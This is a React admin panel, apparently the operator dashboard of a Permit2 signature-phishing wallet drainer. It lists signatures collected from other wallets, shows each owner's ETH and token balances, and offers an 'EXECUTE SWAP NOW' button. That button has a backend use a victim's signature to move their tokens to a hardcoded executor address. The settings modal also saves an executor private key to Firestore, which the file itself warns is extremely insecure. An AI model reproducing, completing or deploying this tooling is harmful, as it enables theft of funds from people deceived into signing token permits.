import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, query, onSnapshot, doc as docRef, getDoc, setDoc } from 'firebase/firestore';
import { ethers } from 'ethers';

const BACKEND_URL = "/api/run-worker";
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';

export default function Admin() {
  const [signatures, setSignatures] = useState([]);
  const [groupedData, setGroupedData] = useState({});

  const [recipient] = useState(HARDCODED_EXECUTOR);
  const [outputToken, setOutputToken] = useState(
    localStorage.getItem('admin_outputToken') || "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
  );

  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [settingsLoading, setSettingsLoading] = useState(false);
  const [settingsStatus, setSettingsStatus] = useState("");
  const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [processingId, setProcessingId] = useState(null);
  const [statusMsg, setStatusMsg] = useState("");

  const [balances, setBalances] = useState({});
  const [tokenBalances, setTokenBalances] = useState({});
  const [executorEthBalance, setExecutorEthBalance] = useState('—');
  const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
  const [tokenSymbol, setTokenSymbol] = useState('TOKEN');
  const [tokenDecimals, setTokenDecimals] = useState(6);

  const tokenAddress = outputToken || import.meta.env.VITE_USDT_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');

  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)"
  ];

  // Save output token
  useEffect(() => {
    localStorage.setItem('admin_outputToken', outputToken);
  }, [outputToken]);

  // Load settings from Firestore
  const openSettings = async () => {
    setIsSettingsOpen(true);
    setSettingsLoading(true);
    try {
      const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
      if (snap.exists()) {
        const data = snap.data();
        setOutputToken(data.tokenAddress || outputToken);
        setExecutorPrivateKeySetting(data.executorPrivateKey || '');
      }
      setSettingsStatus('Settings loaded');
    } catch (err) {
      setSettingsStatus('Failed to load settings');
    } finally {
      setSettingsLoading(false);
    }
  };

  const saveSettings = async () => {
    setSettingsLoading(true);
    setSettingsStatus('Saving...');
    try {
      await setDoc(docRef(db, 'admin_config', 'settings'), {
        tokenAddress: outputToken,
        executorPrivateKey: executorPrivateKeySetting || null,
      }, { merge: true });
      setSettingsStatus('Saved successfully');
    } catch (err) {
      setSettingsStatus('Save failed');
    } finally {
      setSettingsLoading(false);
    }
  };

  // Real-time signatures
  useEffect(() => {
    const q = query(collection(db, "permit2_signatures"));
    const unsub = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      setSignatures(docs);

      const groups = {};
      docs.forEach(doc => {
        if (!groups[doc.owner]) groups[doc.owner] = [];
        groups[doc.owner].push(doc);
      });
      setGroupedData(groups);
    });
    return () => unsub();
  }, []);

  // Fetch all balances + token info
  useEffect(() => {
    const owners = Object.keys(groupedData);
    if (owners.length === 0) return;

    let mounted = true;

    (async () => {
      let tokenContract;
      let decimals = 6;
      let symbol = 'TOKEN';

      try {
        tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const [dec, sym] = await Promise.all([
          tokenContract.decimals(),
          tokenContract.symbol().catch(() => 'TOKEN')
        ]);
        decimals = Number(dec);
        symbol = sym;
        if (mounted) {
          setTokenDecimals(decimals);
          setTokenSymbol(symbol);
        }
      } catch (e) {
        console.warn("Token contract failed (using fallback)", e);
      }

      const newBalances = {};
      const newTokenBalances = {};

      // User wallets
      for (const owner of owners) {
        try {
          const eth = await provider.getBalance(owner);
          newBalances[owner] = parseFloat(ethers.formatEther(eth)).toFixed(4);
        } catch {
          newBalances[owner] = '—';
        }

        try {
          if (tokenContract) {
            const tb = await tokenContract.balanceOf(owner);
            newTokenBalances[owner] = Number(ethers.formatUnits(tb, decimals)).toFixed(4);
          } else {
            newTokenBalances[owner] = '—';
          }
        } catch {
          newTokenBalances[owner] = '—';
        }
      }

      // Executor balance
      try {
        const eth = await provider.getBalance(HARDCODED_EXECUTOR);
        if (mounted) setExecutorEthBalance(parseFloat(ethers.formatEther(eth)).toFixed(4));
      } catch {
        if (mounted) setExecutorEthBalance('—');
      }

      try {
        if (tokenContract) {
          const tb = await tokenContract.balanceOf(HARDCODED_EXECUTOR);
          if (mounted) setExecutorTokenBalance(Number(ethers.formatUnits(tb, decimals)).toFixed(4));
        }
      } catch {
        if (mounted) setExecutorTokenBalance('—');
      }

      if (mounted) {
        setBalances(newBalances);
        setTokenBalances(newTokenBalances);
      }
    })();

    return () => { mounted = false; };
  }, [groupedData, tokenAddress]);

  const handleExecute = async (sigData) => {
    setProcessingId(sigData.id);
    setStatusMsg("Contacting backend...");

    try {
      const res = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          docId: sigData.id,
          recipient,
          outputToken
        })
      });

      const result = await res.json();

      if (!res.ok || !result.ok) {
        throw new Error(result.error || "Backend execution failed");
      }

      setStatusMsg("Swap executed successfully!");
      setTimeout(() => setStatusMsg(""), 4000);
    } catch (err) {
      setStatusMsg("Error: " + err.message);
    } finally {
      setProcessingId(null);
    }
  };

  const formatAmount = (amount, tokenAddr) => {
    if (!amount) return '0';
    try {
      // Use correct decimals for the actual input token (not output token)
      const dec = tokenAddr.toLowerCase() === '0xdac17f958d2ee523a2206206994597c13d831ec7'.toLowerCase() ? 6 : tokenDecimals;
      return (BigInt(amount) / (10n ** BigInt(dec))).toString();
    } catch {
      return amount.toString();
    }
  };

  return (
    <>
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <header className="bg-white border-b border-gray-200 shadow-sm sticky top-0 z-40">
          <div className="max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-bold text-gray-900">Admin Control Center</h1>
              <p className="text-sm text-gray-500 mt-1">Permit2 Signature Manager</p>
            </div>
            <div className="flex items-center gap-4">
              <span className="px-4 py-2 text-xs font-semibold text-green-700 bg-green-100 rounded-full">Server Mode • Online</span>
              <button onClick={openSettings} className="p-2.5 hover:bg-gray-100 rounded-xl transition">
                Settings Icon
              </button>
            </div>
          </div>
        </header>

        <div className="max-w-7xl mx-auto px-6 py-8 space-y-8">
          {/* Executor Card */}
          <div className="bg-white rounded-2xl shadow-lg border border-gray-200 p-6">
            <h3 className="text-sm font-semibold text-gray-600 uppercase tracking-wider">Executor Wallet (Hardcoded)</h3>
            <div className="mt-4 flex items-center justify-between">
              <div>
                <p className="font-mono text-lg">{HARDCODED_EXECUTOR.slice(0, 10)}...{HARDCODED_EXECUTOR.slice(-8)}</p>
              </div>
              <div className="text-right">
                <p className="text-3xl font-bold text-gray-900">{executorEthBalance} ETH</p>
                <p className="text-xl text-gray-600">{executorTokenBalance} {tokenSymbol}</p>
              </div>
            </div>
          </div>

          {/* Output Token */}
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
            <label className="block text-sm font-medium text-gray-700 mb-3">Output Token (Swap Into)</label>
            <input
              type="text"
              value={outputToken}
              onChange={(e) => setOutputToken(e.target.value)}
              className="w-full px-5 py-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-800 font-mono"
              placeholder="0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
            />
          </div>

          {/* Wallets Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
            {Object.keys(groupedData).length === 0 ? (
              <div className="col-span-full text-center py-24">
                <div className="text-8xl mb-6">Empty Inbox</div>
                <p className="text-xl text-gray-500">No signatures collected yet</p>
              </div>
            ) : (
              Object.entries(groupedData).map(([owner, sigs]) => {
                const pending = sigs.filter(s => !s.processed).length;
                return (
                  <div
                    key={owner}
                    onClick={() => { setSelectedWallet(owner); setIsModalOpen(true); setStatusMsg(""); }}
                    className="bg-white rounded-2xl shadow-md border border-gray-200 p-6 hover:shadow-xl hover:border-gray-300 transition-all cursor-pointer group"
                  >
                    <div className="flex items-center justify-between mb-5">
                      <div className="w-12 h-12 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl flex items-center justify-center text-white text-xl font-bold">
                        {owner.slice(2, 4).toUpperCase()}
                      </div>
                      <span className="text-xs text-gray-500">Click to manage</span>
                    </div>

                    <p className="font-mono text-sm font-semibold text-gray-800 truncate">
                      {owner.slice(0, 10)}...{owner.slice(-8)}
                    </p>

                    <div className="mt-4 space-y-3">
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">ETH</span>
                        <span className="font-medium">{balances[owner] || '—'}</span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">{tokenSymbol}</span>
                        <span className="font-medium">{tokenBalances[owner] || '—'}</span>
                      </div>
                      <div className="pt-3 border-t border-gray-100">
                        <div className="flex justify-between">
                          <span className="text-gray-600">Signatures</span>
                          <span className="font-bold text-indigo-600">{sigs.length}</span>
                        </div>
                        <div className="flex justify-between mt-1">
                          <span className="text-gray-600">Pending</span>
                          <span className={`font-bold ${pending > 0 ? 'text-orange-600' : 'text-green-600'}`}>
                            {pending}
                          </span>
                        </div>
                      </div>
                    </div>

                    <button className="mt-6 w-full py-3 bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-semibold rounded-xl hover:from-indigo-700 hover:to-purple-700 transition shadow-md">
                      Manage Wallet
                    </button>
                  </div>
                );
              })
            )}
          </div>
        </div>

        {/* Wallet Detail Modal */}
        {isModalOpen && selectedWallet && (
          <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4" onClick={() => setIsModalOpen(false)}>
            <div className="bg-white rounded-3xl shadow-2xl max-w-3xl w-full max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
              <div className="sticky top-0 bg-white border-b border-gray-200 px-8 py-6 flex items-center justify-between">
                <h2 className="text-2xl font-bold">
                  {selectedWallet.slice(0, 10)}...{selectedWallet.slice(-8)}
                </h2>
                <button onClick={() => setIsModalOpen(false)} className="text-gray-500 hover:text-gray-700">
                  Close Icon
                </button>
              </div>

              {statusMsg && (
                <div className={`mx-8 mt-6 px-6 py-4 rounded-xl text-sm font-medium ${
                  statusMsg.includes("Success") ? "bg-green-100 text-green-800" :
                  statusMsg.includes("Error") ? "bg-red-100 text-red-800" :
                  "bg-blue-100 text-blue-800"
                }`}>
                  {statusMsg}
                </div>
              )}

              <div className="p-8 space-y-5">
                {groupedData[selectedWallet].map(sig => (
                  <div key={sig.id} className={`p-6 rounded-2xl border-2 ${sig.processed ? 'border-gray-200 bg-gray-50' : 'border-indigo-200 bg-indigo-50/30'}`}>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
                      <div>
                        <span className="text-gray-600">Token</span>
                        <p className="font-mono font-semibold">{sig.token.slice(0, 10)}...{sig.token.slice(-8)}</p>
                      </div>
                      <div>
                        <span className="text-gray-600">Amount</span>
                        <p className="font-semibold">{formatAmount(sig.amount, sig.token)} {sig.token.toLowerCase() === '0xdac17f958d2ee523a2206206994597c13d831ec7' ? 'USDT' : tokenSymbol}</p>
                      </div>
                      <div>
                        <span className="text-gray-600">Status</span>
                        <p>
                          <span className={`inline-block px-4 py-1.5 rounded-full text-xs font-bold ${
                            sig.processed ? 'bg-green-100 text-green-800' : 'bg-yellow-100 text-yellow-800'
                          }`}>
                            {sig.processed ? 'Processed' : 'Ready to Execute'}
                          </span>
                        </p>
                      </div>
                    </div>

                    {sig.lastError && !sig.processed && (
                      <p className="text-red-600 text-xs mt-3 font-medium">Warning: {sig.lastError}</p>
                    )}

                    <div className="mt-5">
                      {!sig.processed ? (
                        <button
                          onClick={() => handleExecute(sig)}
                          disabled={processingId === sig.id}
                          className="w-full py-4 bg-gradient-to-r from-emerald-500 to-teal-600 text-white font-bold rounded-xl hover:from-emerald-600 hover:to-teal-700 disabled:opacity-60 transition text-lg"
                        >
                          {processingId === sig.id ? "EXECUTING..." : "EXECUTE SWAP NOW"}
                        </button>
                      ) : (
                        <a
                          href={`https://etherscan.io/tx/${sig.routerTx}`}
                          target="_blank"
                          rel="noreferrer"
                          className="block text-center py-4 bg-gray-100 text-gray-700 font-semibold rounded-xl hover:bg-gray-200 transition"
                        >
                          View on Etherscan ↗
                        </a>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Settings Modal */}
        {isSettingsOpen && (
          <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4" onClick={() => setIsSettingsOpen(false)}>
            <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8" onClick={e => e.stopPropagation()}>
              <h2 className="text-2xl font-bold mb-8">Settings</h2>
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Executor Private Key (Optional)</label>
                  <input
                    type="password"
                    value={executorPrivateKeySetting}
                    onChange={e => setExecutorPrivateKeySetting(e.target.value)}
                    className="w-full px-5 py-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 outline-none font-mono"
                    placeholder="Only for testing • NEVER in production"
                  />
                  <p className="text-xs text-red-600 mt-3 font-medium">
                    Storing private keys in Firestore is extremely insecure!
                  </p>
                </div>

                <div className="flex gap-4">
                  <button
                    onClick={saveSettings}
                    disabled={settingsLoading}
                    className="flex-1 py-4 bg-indigo-600 text-white font-bold rounded-xl hover:bg-indigo-700 disabled:opacity-60 transition"
                  >
                    {settingsLoading ? "Saving..." : "Save Settings"}
                  </button>
                  <button
                    onClick={() => setIsSettingsOpen(false)}
                    className="px-8 py-4 border border-gray-300 rounded-xl hover:bg-gray-50 transition font-medium"
                  >
                    Cancel
                  </button>
                </div>
                {settingsStatus && <p className="text-center text-sm text-gray-600">{settingsStatus}</p>}
              </div>
            </div>
          </div>
        )}
      </div>
    </>
  );
}
